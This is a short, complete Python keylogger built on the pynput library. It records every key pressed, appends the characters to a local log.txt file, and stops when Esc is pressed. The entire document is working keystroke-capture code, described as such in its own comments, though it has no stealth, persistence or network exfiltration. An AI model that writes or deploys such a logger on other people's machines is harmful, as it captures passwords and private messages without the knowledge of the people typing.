import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)                                        # Adds next character into keys list
    count += 1
#    print("{0} pressed".format(key))                       # Test print to terminal if on_press is working

    if count >= 1:                                          # Every 1 key we update the file
        count = 0                                           # Reset count variable
        write_file(keys)
        keys = []                                           # Reset keys list

def write_file(keys):                                       # Function that writes users keystrokes to a textfile
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")                    # Removes quotation marks from recorded keys in log.txt
            if k.find("space") > 0:                         # Searches for space in string of log.txt and goes to the next line
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):                                        # function called when user releases the key
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:            # Calls the on_press and on_release function that listens on what keystrokes are pressed
    listener.join()
